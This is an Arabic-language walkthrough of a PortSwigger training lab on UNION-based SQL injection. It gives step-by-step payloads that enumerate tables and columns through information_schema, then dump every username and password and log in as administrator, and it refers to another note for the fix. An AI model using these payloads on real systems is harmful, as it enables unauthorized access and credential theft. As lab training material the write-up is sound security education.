# [SQL injection attack, listing the database contents on non-Oracle databases](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle)

## **`الهدف`**
قم بتنفيذ هجوم `UNION SQLi` يقوم بإسترجاع/عرض كل أسماء المستخدمين وكلمات المرور ثم قم بتسجيل الدخول بحساب `administrator`.
## **`خطوات الحل`**
سنقوم بتكرار نفس خطوات حل [هذا اللاب](./SQL-injection-UNION-attack,-determining-the-number-of-columns-returned-by-the-query.md) لتحديد عدد الأعمدة بإستخدام `NULL` وسنجد أنها عمودين
```sql
' UNION SELECT NULL,NULL--
``` 

بعد ذلك سنقوم بمحاولة لتغيير كل `NULL` بأى سلسلة نصية مثل: 'A' وسنكتشف أن كلا العمودين يدعموا النصوص، بعد ذلك سنقوم بحقن الأمر التالي لرؤية مخطط المعلومات وعرض قائمة الجداول.
```sql
' UNION SELECT table_name,NULL FROM information_schema.tables--
```

وسنكتشف وجود جدول يُسمى `users_oeipcx` فسنقوم بحقن الأمر التالي لنرى الأعمدة الموجودة بداخله
```sql
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_oeipcx'--
```

وسنكتشف وجود جدول يُسمى `username_yobgsh` وجدول يُسمى `password_jbejra` لذلك سنقوم بحقن الأمر التالي لنحصل على الاسم وكلمة المرور لجميع المستخدمين
```sql
' UNION SELECT username_yobgsh, password_jbejra FROM users_oeipcx--
```
ثم نقوم بإرسال الطلب ونقوم بالضغط على `Mouse right-click` ثم `Copy URL` ونقوم بفتحه في المتصفح وسنجد بيانات جميع المستخدمين ظاهرة فنقوم بعدها بتسجيل الدخول إلى حساب `administrator:mtf0vf73uz9yqx6bn9sh` لننتهي من حل اللاب.
## **`ترقيع الثغرة`**
**`نفس ترقيع لاب` [SQL injection vulnerability in WHERE clause allowing retrieval of hidden data](./SQL-injection-vulnerability-in-WHERE-clause-allowing-retrieval-of-hidden-data.md)
